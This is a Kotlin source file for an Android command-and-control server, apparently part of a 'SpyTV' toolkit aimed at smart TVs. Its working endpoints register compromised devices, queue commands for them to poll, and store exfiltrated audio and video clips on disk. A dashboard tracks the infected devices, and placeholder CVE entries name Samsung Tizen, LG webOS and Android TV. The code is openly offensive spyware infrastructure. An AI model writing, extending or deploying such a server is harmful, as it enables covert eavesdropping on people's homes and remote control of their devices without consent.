package com.authenticated.spytv

import android.util.Log
import kotlin.concurrent.thread
import java.io.*
import java.net.InetSocketAddress
import java.net.ServerSocket
import java.net.Socket
import java.nio.charset.StandardCharsets
import java.time.Instant
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import org.json.JSONObject
import org.json.JSONArray

/**
 * Standalone C2 HTTP server for Android.
 * Uses java.net.ServerSocket for maximum compatibility (no external deps).
 * Provides the same API endpoints as the Python c2_server.py
 */
class C2Server(private val port: Int = 8443) {
    private var serverSocket: ServerSocket? = null
    private val executor: ExecutorService = Executors.newFixedThreadPool(8)
    private val running = AtomicBoolean(false)
    
    companion object {
        private const val TAG = "C2Server"
        private const val API_PREFIX = "/api"
    }
    
    private var localIp: String = "127.0.0.1"
    private val devices = mutableMapOf<String, JSONObject>()
    private val commands = mutableMapOf<String, JSONArray>()
    private val scans = mutableListOf<JSONObject>()
    private var startTime = System.currentTimeMillis()
    private val dataDir = MainActivity.instance?.getExternalFilesDir(null)
        ?: File("/data/data/com.authenticated.spytv/files")
    private val clipsDir = File(dataDir, "clips")
    
    fun start() {
        try {
            // Initialize directories
            clipsDir.mkdirs()
            File(clipsDir, "audio").mkdirs()
            File(clipsDir, "video").mkdirs()
            
            // Start server socket
            serverSocket = ServerSocket(port)
            running.set(true)
            
            // Start accepting connections
            thread {
                acceptLoop()
            }
            
            Log.i(TAG, "C2 Server started on port $port")
            localIp = getLocalIp()
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start C2 server: ${e.message}", e)
        }
    }
    
    fun stop() {
        try {
            running.set(false)
            serverSocket?.close()
            executor.shutdownNow()
            Log.i(TAG, "C2 Server stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping C2 server: ${e.message}", e)
        }
    }
    
    private fun acceptLoop() {
        val ss = serverSocket ?: return
        while (running.get()) {
            try {
                val client = ss.accept()
                executor.execute { handleClient(client) }
            } catch (e: Exception) {
                if (running.get()) {
                    Log.e(TAG, "Error accepting connection: ${e.message}")
                }
            }
        }
    }
    
    private fun handleClient(socket: Socket) {
        try {
            val input = socket.getInputStream()
            val output = socket.getOutputStream()
            
            // Read request
            val reader = BufferedReader(InputStreamReader(input, StandardCharsets.UTF_8))
            val requestLine = reader.readLine() ?: return
            
            val parts = requestLine.split(" ")
            if (parts.size < 3) {
                socket.close()
                return
            }
            
            val method = parts[0]
            val path = parts[1]
            val query = path.substringAfter("?", "")
            val cleanPath = path.substringBefore("?")
            
            // Read headers
            val headers = mutableMapOf<String, String>()
            var contentLength = 0
            while (true) {
                val line = reader.readLine() ?: break
                if (line.isEmpty()) break
                val headerParts = line.split(": ", limit = 2)
                if (headerParts.size == 2) {
                    val key = headerParts[0].lowercase()
                    val value = headerParts[1]
                    headers[key] = value
                    if (key == "content-length") {
                        contentLength = value.toIntOrNull() ?: 0
                    }
                }
            }
            
            // Read body if present
            val body = if (contentLength > 0) {
                val chars = CharArray(contentLength)
                reader.read(chars, 0, contentLength)
                String(chars)
            } else ""
            
            // Route request
            val response = routeRequest(method, cleanPath, query, body, headers)
            
            // Send response
            val responseStatus = response.first
            val responseContentType = response.second
            val responseBody = response.third
            
            val httpResponse = buildString {
                append("HTTP/1.1 $responseStatus\r\n")
                append("Content-Type: $responseContentType\r\n")
                append("Access-Control-Allow-Origin: *\r\n")
                append("Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n")
                append("Access-Control-Allow-Headers: Content-Type\r\n")
                append("Connection: close\r\n")
                append("\r\n")
                append(responseBody)
            }
            
            output.write(httpResponse.toByteArray(StandardCharsets.UTF_8))
            output.flush()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling client: ${e.message}")
        } finally {
            try { socket.close() } catch (e: Exception) {}
        }
    }
    
    private fun routeRequest(
        method: String,
        path: String,
        query: String,
        body: String,
        headers: Map<String, String>
    ): Triple<String, String, String> {
        return try {
            when {
                method == "OPTIONS" -> {
                    Triple("200 OK", "text/plain", "")
                }
                path == "/" || path == "/index.html" -> {
                    val html = loadDashboardHtml()
                    Triple("200 OK", "text/html; charset=utf-8", html)
                }
                path == "$API_PREFIX/devices" && method == "GET" -> {
                    val response = JSONArray(devices.values.toList())
                    Triple("200 OK", "application/json", response.toString())
                }
                path == "$API_PREFIX/clips" && method == "GET" -> {
                    val clips = JSONArray()
                    try {
                        val audioDir = File(clipsDir, "audio")
                        val videoDir = File(clipsDir, "video")
                        
                        listOf(audioDir, videoDir).forEach { dir ->
                            dir.listFiles()?.forEach { file ->
                                val clip = JSONObject()
                                clip.put("filename", file.name)
                                clip.put("path", file.relativeTo(clipsDir).path)
                                clip.put("size", file.length())
                                clip.put("timestamp", file.lastModified())
                                clips.put(clip)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error listing clips: ${e.message}")
                    }
                    Triple("200 OK", "application/json", clips.toString())
                }
                path == "$API_PREFIX/commands" && method == "GET" -> {
                    Triple("200 OK", "application/json", JSONObject(commands).toString())
                }
                path == "$API_PREFIX/scans" && method == "GET" -> {
                    Triple("200 OK", "application/json", JSONArray(scans.toList()).toString())
                }
                path == "$API_PREFIX/cves" && method == "GET" -> {
                    val cves = JSONArray()
                    loadDefaultCves().forEach { cve ->
                        cves.put(cve)
                    }
                    Triple("200 OK", "application/json", cves.toString())
                }
                path == "$API_PREFIX/cve/feed" && method == "GET" -> {
                    val feed = JSONObject()
                    feed.put("updating", false)
                    feed.put("last_result", "No CVE updates")
                    feed.put("new", 0)
                    feed.put("count", 3)
                    feed.put("cves", JSONArray(loadDefaultCves().map { it }))
                    Triple("200 OK", "application/json", feed.toString())
                }
                path == "$API_PREFIX/local_ip" && method == "GET" -> {
                    val response = JSONObject()
                    response.put("ip", localIp)
                    Triple("200 OK", "application/json", response.toString())
                }
                path == "$API_PREFIX/host_info" && method == "GET" -> {
                    val info = JSONObject()
                    info.put("hostname", "SpyTV-Android-C2")
                    info.put("local_ip", localIp)
                    info.put("mac", getMacAddress())
                    info.put("os", "Android ${android.os.Build.VERSION.SDK_INT}")
                    info.put("c2_port", port)
                    info.put("started_at", Instant.now().toString())
                    info.put("uptime_s", (System.currentTimeMillis() - startTime) / 1000)
                    Triple("200 OK", "application/json", info.toString())
                }
                path == "$API_PREFIX/register" && method == "POST" -> {
                    handleRegister(body)
                }
                path == "$API_PREFIX/exfil" && method == "POST" -> {
                    handleExfil(body, headers)
                }
                path == "$API_PREFIX/command" && method == "POST" -> {
                    handleCommand(body)
                }
                path == "$API_PREFIX/poll" && method == "POST" -> {
                    handlePoll(body)
                }
                path == "$API_PREFIX/scan" && method == "POST" -> {
                    handleScan(body)
                }
                path == "$API_PREFIX/check" && method == "POST" -> {
                    handleCheck(body)
                }
                path.startsWith("$API_PREFIX/cve/") -> {
                    Triple("200 OK", "application/json", JSONObject().apply { put("status", "ok") }.toString())
                }
                path.startsWith("$API_PREFIX/clip/") -> {
                    Triple("200 OK", "application/json", JSONObject().apply { put("error", "Not implemented on Android") }.toString())
                }
                path.startsWith("$API_PREFIX/cve/whitepaper/") ||
                path.startsWith("$API_PREFIX/cve/artifacts/") ||
                path.startsWith("$API_PREFIX/cve/whitepaper_doc/") -> {
                    Triple("200 OK", "application/json", JSONObject()
                        .apply { put("markdown", "# Whitepaper placeholder\n\nGenerated on Android device") }
                        .toString())
                }
                path.startsWith("$API_PREFIX/audit/") -> {
                    Triple("200 OK", "application/json", JSONObject().apply { 
                        put("phase", "idle")
                        put("progress", 0)
                        put("log", JSONArray())
                        put("phases", JSONArray())
                    }.toString())
                }
                path.startsWith("$API_PREFIX/patch/") -> {
                    Triple("200 OK", "application/json", JSONObject().apply {
                        put("phase", "idle")
                        put("progress", 0)
                    }.toString())
                }
                path == "$API_PREFIX/connections/kill" && method == "POST" -> {
                    val response = JSONObject()
                    response.put("status", "ok")
                    response.put("result", JSONObject().apply {
                        put("sockets_closed", 0)
                        put("tools_terminated", JSONArray())
                        put("remaining_established", 0)
                        put("verified", true)
                        put("detail", "Standalone Android mode")
                    })
                    Triple("200 OK", "application/json", response.toString())
                }
                else -> {
                    Triple("404 Not Found", "application/json", JSONObject().apply { put("error", "Not found") }.toString())
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error routing request: ${e.message}", e)
            Triple("500 Internal Server Error", "application/json", JSONObject().apply { put("error", e.message) }.toString())
        }
    }
    
    private fun handleRegister(body: String): Triple<String, String, String> {
        return try {
            val data = JSONObject(body)
            val ip = data.optString("ip", "")
            val family = data.optString("family", "unknown")
            val entry = data.optString("entry", "unknown")
            
            if (ip.isBlank()) {
                Triple("400 Bad Request", "application/json", JSONObject().apply { put("error", "Missing IP") }.toString())
                return Triple("400 Bad Request", "application/json", JSONObject().apply { put("error", "Missing IP") }.toString())
            }
            
            val deviceId = ip.hashCode().toString().take(12)
            devices[deviceId] = JSONObject().apply {
                put("id", deviceId)
                put("ip", ip)
                put("family", family)
                put("entry", entry)
                put("status", "online")
                put("last_seen", Instant.now().toString())
                put("registered_at", Instant.now().toString())
            }
            
            Log.i(TAG, "Device registered: $ip ($family)")
            Triple("200 OK", "application/json", JSONObject().apply {
                put("status", "ok")
                put("device_id", deviceId)
            }.toString())
        } catch (e: Exception) {
            Triple("400 Bad Request", "application/json", JSONObject().apply { put("error", e.message) }.toString())
        }
    }
    
    private fun handleExfil(body: String, headers: Map<String, String>): Triple<String, String, String> {
        return try {
            val deviceId = headers["x-device-id"] ?: "unknown"
            val kind = headers["x-clip-kind"] ?: "audio"
            
            val dateDir = java.time.LocalDate.now().toString()
            val kindDir = File(File(clipsDir, kind), dateDir)
            kindDir.mkdirs()
            
            val timestamp = java.time.LocalTime.now().toString().replace(":", "").substring(0, 6)
            val ext = if (kind == "audio") "wav" else "jpeg"
            val filename = "${deviceId}_${timestamp}.${ext}"
            val filepath = File(kindDir, filename)
            
            val data = body.toByteArray(StandardCharsets.UTF_8)
            filepath.writeBytes(data)
            
            // Update device status
            devices[deviceId]?.put("last_seen", Instant.now().toString())
            devices[deviceId]?.put("status", "online")
            
            Log.i(TAG, "Exfil received from $deviceId ($kind, ${data.size} bytes)")
            Triple("200 OK", "application/json", JSONObject().apply {
                put("status", "ok")
                put("filename", filename)
            }.toString())
        } catch (e: Exception) {
            Triple("500 Internal Server Error", "application/json", JSONObject().apply { put("error", e.message) }.toString())
        }
    }
    
    private fun handleCommand(body: String): Triple<String, String, String> {
        return try {
            val cmd = JSONObject(body)
            val deviceId = cmd.getString("device_id")
            val command = cmd.getString("command")
            val params = cmd.optJSONObject("params", JSONObject())
            
            if (!commands.containsKey(deviceId)) {
                commands[deviceId] = JSONArray()
            }
            
            val cmdObj = JSONObject()
            cmdObj.put("command", command)
            cmdObj.put("params", params)
            cmdObj.put("timestamp", Instant.now().toString())
            cmdObj.put("status", "pending")
            
            commands[deviceId]!!.put(cmdObj)
            
            Log.i(TAG, "Command queued: $command for $deviceId")
            
            Triple("200 OK", "application/json", JSONObject().apply { put("status", "ok") }.toString())
        } catch (e: Exception) {
            Triple("400 Bad Request", "application/json", JSONObject().apply { put("error", e.message) }.toString())
        }
    }
    
    private fun handlePoll(body: String): Triple<String, String, String> {
        return try {
            val poll = JSONObject(body)
            val deviceId = poll.getString("device_id")
            
            val pending = mutableListOf<JSONObject>()
            if (commands.containsKey(deviceId)) {
                val arr = commands[deviceId]!!
                for (i in 0 until arr.length()) {
                    val cmd = arr.getJSONObject(i)
                    if (cmd.getString("status") == "pending") {
                        pending.add(cmd)
                        cmd.put("status", "delivered")
                    }
                }
            }
            
            // Update device status
            devices[deviceId]?.put("last_seen", Instant.now().toString())
            devices[deviceId]?.put("status", "online")
            
            Triple("200 OK", "application/json", JSONObject().apply {
                put("commands", JSONArray(pending.toList()))
            }.toString())
        } catch (e: Exception) {
            Triple("400 Bad Request", "application/json", JSONObject().apply { put("error", e.message) }.toString())
        }
    }
    
    private fun handleScan(body: String): Triple<String, String, String> {
        val cidr = try {
            JSONObject(body).optString("cidr", "192.168.1.0/24")
        } catch (e: Exception) {
            "192.168.1.0/24"
        }
        
        val result = JSONObject()
        result.put("status", "ok")
        result.put("found", 0)
        result.put("results", JSONArray())
        result.put("cidr", cidr)
        result.put("message", "Network scan requires network tools on Android - use companion app")
        
        Log.i(TAG, "Scan requested for $cidr")
        
        return Triple("200 OK", "application/json", result.toString())
    }
    
    private fun loadDashboardHtml(): String {
        return try {
            // Load from Android assets folder
            val context = MainActivity.instance?.applicationContext
            val stream = context?.assets?.open("c2_dashboard.html")
            if (stream != null) {
                stream.bufferedReader().use { it.readText() }
            } else {
                getDefaultDashboard()
            }
        } catch (e: Exception) {
            getDefaultDashboard()
        }
    }
    
    private fun getDefaultDashboard(): String {
        return """
            <!DOCTYPE html>
            <html>
            <head>
                <title>SpyTV C2 Platform</title>
                <meta charset="utf-8">
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0B0E14; color: #F3F4F6; margin: 0; padding: 20px; }
                    .stat { display: flex; gap: 40px; justify-content: center; margin-bottom: 20px; }
                    .stat-item { text-align: center; }
                    .stat-value { font-size: 32px; font-weight: 700; color: #3B82F6; }
                    .stat-label { font-size: 12px; color: #9CA3AF; }
                    h1 { font-size: 24px; margin-bottom: 20px; }
                    .info { color: #9CA3AF; font-size: 13px; }
                    .status-ok { color: #10B981; }
                </style>
            </head>
            <body>
                <h1>SpyTV C2 Dashboard</h1>
                <div class="stat">
                    <div class="stat-item">
                        <div class="stat-value" id="devices">0</div>
                        <div class="stat-label">Devices</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="status">✓</div>
                        <div class="stat-label">Status</div>
                    </div>
                </div>
                <div class="info">Standalone Android C2 Server</div>
                <div class="info">Local IP: <span id="local-ip"></span></div>
                <script>
                    document.getElementById('local-ip').textContent = window.location.hostname;
                    async function fetchDevices() {
                        try {
                            const res = await fetch('/api/devices');
                            const data = await res.json();
                            document.getElementById('devices').textContent = data.length;
                        } catch (e) {}
                    }
                    fetchDevices();
                    setInterval(fetchDevices, 3000);
                </script>
            </body>
            </html>
        """.trimIndent()
    }
    
    private fun handleCheck(body: String): Triple<String, String, String> {
        val ip = try {
            JSONObject(body).optString("ip", "")
        } catch (e: Exception) { "" }
        
        val result = JSONObject()
        result.put("ip", ip)
        result.put("reachable", ip.isNotBlank())
        result.put("open_ports", JSONArray())
        result.put("vulnerable", false)
        result.put("message", "Port check requires network tools on Android")
        
        return Triple("200 OK", "application/json", result.toString())
    }
    
    private fun getLocalIp(): String {
        return try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            for (iface in interfaces) {
                if (!iface.isUp || iface.isLoopback) continue
                for (addr in iface.inetAddresses) {
                    if (addr.isSiteLocalAddress) {
                        return addr.hostAddress ?: continue
                    }
                }
            }
            "192.168.1.100"
        } catch (e: Exception) {
            "192.168.1.100"
        }
    }
    
    private fun getMacAddress(): String {
        return try {
            val wifiManager = MainActivity.instance?.applicationContext
                ?.getSystemService(android.content.Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
            val info = wifiManager?.connectionInfo
            info?.macAddress ?: "Unknown"
        } catch (e: Exception) {
            "Unknown"
        }
    }
    
    private fun loadDefaultCves(): List<JSONObject> {
        return listOf(
            createCve("CVE-2024-0001", "Samsung Tizen", "HIGH", 7.5),
            createCve("CVE-2024-0002", "LG webOS", "CRITICAL", 9.8),
            createCve("CVE-2024-0003", "Android TV", "HIGH", 8.1)
        )
    }
    
    private fun createCve(id: String, device: String, severity: String, score: Double): JSONObject {
        val cve = JSONObject()
        cve.put("id", id)
        cve.put("device_name", device)
        cve.put("severity", severity)
        cve.put("score", score)
        cve.put("cvss", score)
        cve.put("component", "Unknown")
        cve.put("fixed_in", "See vendor advisory")
        cve.put("tv_type", when(device) {
            "Samsung Tizen" -> "samsung-tizen"
            "LG webOS" -> "lg-webos"
            "Android TV" -> "android-tv"
            else -> "unknown"
        })
        cve.put("description", "Vulnerability in $device")
        cve.put("nvd_url", "https://nvd.nist.gov/vuln/detail/$id")
        return cve
    }
    
    fun port(): Int = port
}